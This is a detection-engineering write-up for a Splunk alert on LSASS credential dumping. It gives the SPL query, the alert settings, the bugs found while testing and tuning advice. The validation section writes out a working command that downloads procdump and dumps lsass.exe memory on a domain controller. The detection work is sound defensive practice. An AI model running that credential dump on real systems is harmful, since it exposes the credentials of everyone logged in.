# Detection 03 — LSASS Credential Access

| | |
|---|---|
| MITRE ATT&CK | T1003.001 — OS Credential Dumping: LSASS Memory |
| Tactic | Credential Access |
| Data source | Sysmon Event ID 10 (Process access) — `index=main` |
| Severity | Critical |
| Status | **Deployed and validated end-to-end (2026-08-30)** |

## What it detects

`lsass.exe` holds the credentials of everyone logged into a machine, which is why dumping its memory (Mimikatz, comsvcs.dll, procdump, and most C2 frameworks) is the single highest-value move an attacker makes on a Windows host. Sysmon Event ID 10 logs every process that opens a handle to another — the trick is that legitimate access to LSASS is rare and comes from a short, known list of system processes, while credential theft asks for specific memory-read access rights.

This rule keys on two signals: a **GrantedAccess** mask that is dump-capable (the rights Mimikatz/procdump-style tools request), or a **CallTrace** that contains `UNKNOWN` — meaning the call came from memory not backed by any file on disk, which is what injected/reflectively-loaded attack code looks like — from a process that isn't PowerShell.

## Lessons from validating against live data

The first draft of this rule missed its own test entirely. Two things were found and fixed by comparing the query against a real triggering event:

1. **Case sensitivity on GrantedAccess.** Sysmon logs the access mask in uppercase (`0x1FFFFF`), but the rule's `IN()` list was written in lowercase (`0x1fffff`). Splunk's string comparison is case-sensitive, so the real procdump test event — which should have been the clearest possible signal — was silently dropped. Fixed with `eval ga=lower(GrantedAccess)` and a lowercase comparison list. (Same class of bug as rule 01's registry-path case issue — worth checking on every new rule that compares raw Windows field values.)
2. **PowerShell baseline noise.** Before any test was run, the rule already had false positives: `powershell.exe` on all three hosts (target_1, target_2, windows_server) opens `lsass.exe` with `GrantedAccess=0x1410` and an `UNKNOWN` frame in `CallTrace` as part of completely routine activity (PowerShell resolving a SID to a username triggers this). That combination is exactly what the original rule alerted on, so it would have paged every few minutes with nothing wrong. Fixed by splitting the logic: a **dump-capable access mask** (`0x1438`, `0x143a`, `0x1f0fff`, `0x1f1fff`, `0x1fffff`) alerts regardless of source process, but a merely **unknown call trace with a weak/query-only access mask only alerts when the source process is not PowerShell** — since that specific combination from `powershell.exe`/`pwsh.exe` is the confirmed-benign baseline.

## Search (deployed alert)

```spl
index=main EventCode=10
TargetImage="*\\lsass.exe"
NOT SourceImage IN (
    "C:\\Windows\\System32\\wininit.exe",
    "C:\\Windows\\System32\\services.exe",
    "C:\\Windows\\System32\\csrss.exe",
    "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "C:\\Windows\\System32\\MsMpEng.exe",
    "C:\\ProgramData\\Microsoft\\Windows Defender\\*"
)
| eval ga=lower(GrantedAccess)
| eval src=lower(SourceImage)
| eval strong_access = if(ga IN ("0x1438","0x143a","0x1f0fff","0x1f1fff","0x1fffff"), 1, 0)
| eval injected_caller = if(match(CallTrace, "(?i)unknown"), 1, 0)
| eval is_powershell = if(like(src,"%\\powershell.exe") OR like(src,"%\\pwsh.exe"), 1, 0)
| where strong_access=1 OR (injected_caller=1 AND is_powershell=0)
| stats min(_time) as firstTime max(_time) as lastTime count values(GrantedAccess) as GrantedAccess by host, SourceImage, SourceUser
| convert ctime(firstTime) ctime(lastTime)
| sort - lastTime
```

`SourceImage` is the process that opened the handle; `GrantedAccess` the rights it asked for; `SourceUser` the account it ran as.

## Alert configuration (as deployed)

| Setting | Value |
|---|---|
| Type | Scheduled |
| Schedule (cron) | `*/5 * * * *` (every 5 minutes) |
| Time range | Last 5 minutes |
| Trigger | Number of Results > 0 |
| Throttle | Suppress by `host`, `SourceImage` for 3600 seconds |
| Action | Add to Triggered Alerts, Severity **Critical** |

## Validation

Tested end-to-end via Caldera Manual Command on 2026-08-30, on the Windows Server (DC):

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "C:\Windows\Temp\Procdump.zip"; Expand-Archive -Path "C:\Windows\Temp\Procdump.zip" -DestinationPath "C:\Windows\Temp\Procdump" -Force
C:\Windows\Temp\Procdump\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\out.dmp
```

Sysmon logged the access immediately:

```
SourceImage: C:\Windows\Temp\Procdump\procdump64.exe
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1FFFFF
CallTrace: (fully resolved — every frame maps to a real, signed DLL, no UNKNOWN)
SourceUser: LAITH\Administrator
TargetUser: NT AUTHORITY\SYSTEM
```

The first version of the rule missed this event (case-sensitivity bug, above). After the fix, the query correctly returned it (`strong_access=1` from `0x1FFFFF`) while the pre-existing PowerShell/`0x1410`/`UNKNOWN` baseline noise on all three hosts correctly disappeared from the results. Confirmed chain:

**Caldera (Manual Command) → download + run procdump on the target → LSASS memory access → Sysmon (Event ID 10) → Splunk → Alert.**

Delete the dump file after each test run — it contains real in-memory credential material:

```powershell
Remove-Item C:\Windows\Temp\out.dmp -Force
```

## Tuning notes

- Confirm Sysmon Event ID 10 for `lsass.exe` is enabled — the Olaf `sysmon-modular` config logs it by default.
- Legitimate EDR/AV/backup products can read LSASS. Watch the first few days of results in production and add any confirmed-good `SourceImage` to the exclusion list, but keep exclusions tight.
- `procdump.exe` itself is not excluded on purpose — in real life an attacker can rename it or drop a differently-named copy of the same tool, so the rule detects on *behavior* (the access mask), not on the filename. Nothing dump-capable should be on this box outside a deliberate test.
- If Invoke-Mimikatz-style in-memory PowerShell credential theft needs to be caught too (a case the current rule intentionally under-detects, to kill the SID-lookup noise), consider a companion rule that flags PowerShell requesting a *strong* dump-capable mask specifically — that case still alerts under `strong_access=1` regardless of source process, so it isn't actually blind to it, only to the weak-mask/unknown-callstack combination.
